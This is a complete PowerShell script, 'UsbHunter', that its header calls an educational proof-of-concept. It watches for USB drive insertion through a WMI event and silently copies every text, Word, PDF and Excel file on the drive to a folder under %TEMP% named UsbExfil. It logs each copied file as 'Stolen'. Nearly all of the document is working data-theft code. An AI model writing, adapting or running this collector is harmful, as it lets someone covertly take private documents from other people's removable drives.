<#
.SYNOPSIS
UsbHunter - USB Drive Monitor & Exfiltrator
Educational Proof-of-Concept

.DESCRIPTION
Monitors for USB drive insertion events.
On detection:
1. Enumerates files on the USB.
2. Automatically copies documents (docs, pdf, txt) to a hidden local folder.
#>

$DestPath = "$env:TEMP\UsbExfil"
New-Item -ItemType Directory -Force -Path $DestPath | Out-Null

Write-Host "UsbHunter - Waiting for Drives..." -ForegroundColor Cyan

# WMI Event Watcher for Win32_VolumeChangeEvents gave issues in newer PS,
# So we poll simply or register WMI event.

$query = "SELECT * FROM __InstanceOperationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2" 

Register-WmiEvent -Query $query -SourceIdentifier "USBDetect" -Action {
    $e = $Event.SourceEventArgs.NewEvent.TargetInstance
    $drive = $e.DeviceID
    
    Write-Host "[+] USB Detected: $drive" -ForegroundColor Green
    
    # Exfil Logic
    $files = Get-ChildItem -Path "$($drive)\" -Recurse -Include *.txt,*.doc*,*.pdf,*.xls* -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        $dest = "$env:TEMP\UsbExfil\$($file.Name)"
        Copy-Item -Path $file.FullName -Destination $dest -Force
        Write-Host "    [!] Stolen: $($file.Name)" -ForegroundColor Yellow
    }
}

# Keep script running
try {
    while ($true) { Start-Sleep -Seconds 1 }
} finally {
    Unregister-Event "USBDetect"
}
